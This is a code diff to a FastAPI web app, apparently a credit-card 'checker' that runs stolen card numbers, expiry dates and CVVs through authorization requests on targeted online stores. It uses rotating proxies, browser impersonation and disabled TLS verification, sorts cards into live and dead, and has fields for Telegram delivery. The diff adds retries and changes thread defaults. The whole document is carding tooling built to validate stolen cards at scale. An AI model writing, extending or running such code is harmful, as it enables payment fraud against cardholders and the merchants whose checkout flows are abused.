@@ -23,7 +23,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.rotating.checker")
 
-app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.3.0")
+app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.4.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "astra_store": {
@@ -165,7 +165,6 @@ def parse_proxy_string(proxy_url: str | None) -> dict[str, str] | None:
         return None
     raw = proxy_url.strip()
     
-    # Inaayos ang parsing para sa https:// o http:// URL formats ng Thordata
     if "://" in raw:
         formatted = re.sub(r'^(https?|socks5):\/\/', 'http://', raw)
     else:
@@ -462,43 +461,53 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
         "Accept-Language": "en-US,en;q=0.9",
     }
 
-    try:
-        async with AsyncSession(
-            impersonate="chrome120",
-            proxies=proxies_dict,
-            headers=browser_headers,
-            verify=False,
-            timeout=20,
-        ) as session:
-            if chosen_key == "astra_store":
-                status, reason, code = await execute_astra_auth(session, cc, mm, yy, cvv)
-            else:
-                status, reason, code = await execute_rollerco_auth(session, cc, mm, yy, cvv)
+    max_retries = 2
+    last_exc = None
 
-            bin_info = await bin_task
-            elapsed = (time.perf_counter() - started) * 1000
-            return AuthVerdict(
-                status=status,
-                reason=reason,
-                http_status=code,
-                latency_ms=elapsed,
-                bin_info=bin_info,
-                target_used=gate["name"],
-                card_masked=card_masked,
-                proxy_used=proxy_url,
-            )
-    except Exception as exc:
-        bin_info = await bin_task
-        elapsed = (time.perf_counter() - started) * 1000
-        return AuthVerdict(
-            status="NETWORK_ERROR",
-            reason=f"{type(exc).__name__}: {str(exc)[:90]}",
-            latency_ms=elapsed,
-            bin_info=bin_info,
-            target_used=gate["name"],
-            card_masked=card_masked,
-            proxy_used=proxy_url,
-        )
+    for attempt in range(max_retries + 1):
+        try:
+            async with AsyncSession(
+                impersonate="chrome120",
+                proxies=proxies_dict,
+                headers=browser_headers,
+                verify=False,
+                timeout=25,
+            ) as session:
+                if chosen_key == "astra_store":
+                    status, reason, code = await execute_astra_auth(session, cc, mm, yy, cvv)
+                else:
+                    status, reason, code = await execute_rollerco_auth(session, cc, mm, yy, cvv)
+
+                bin_info = await bin_task
+                elapsed = (time.perf_counter() - started) * 1000
+                return AuthVerdict(
+                    status=status,
+                    reason=reason,
+                    http_status=code,
+                    latency_ms=elapsed,
+                    bin_info=bin_info,
+                    target_used=gate["name"],
+                    card_masked=card_masked,
+                    proxy_used=proxy_url,
+                )
+        except Exception as exc:
+            last_exc = exc
+            if attempt < max_retries:
+                await asyncio.sleep(1.0)
+                continue
+            break
+
+    bin_info = await bin_task
+    elapsed = (time.perf_counter() - started) * 1000
+    return AuthVerdict(
+        status="NETWORK_ERROR",
+        reason=f"{type(last_exc).__name__}: {str(last_exc)[:90]}",
+        latency_ms=elapsed,
+        bin_info=bin_info,
+        target_used=gate["name"],
+        card_masked=card_masked,
+        proxy_used=proxy_url,
+    )
 
 
 @app.get("/api/proxy/test")
@@ -583,7 +592,7 @@ async def index() -> str:
                     </div>
                     <div class="flex-1">
                         <label class="block text-xs font-medium text-slate-400 mb-1">Card Threads</label>
-                        <input id="cardThreads" type="number" value="5" min="1" max="50" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center">
+                        <input id="cardThreads" type="number" value="3" min="1" max="50" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center">
                     </div>
                 </div>
             </div>
@@ -806,7 +815,7 @@ async def index() -> str:
         const deadBox = document.getElementById("deadBox");
         const bar = document.getElementById("progressBar");
         const target = document.getElementById("targetSelect").value;
-        const maxThreads = parseInt(document.getElementById("cardThreads").value) || 5;
+        const maxThreads = parseInt(document.getElementById("cardThreads").value) || 3;
 
         const tgToken = document.getElementById("tgToken").value.trim();
         const tgChatId = document.getElementById("tgChatId").value.trim();
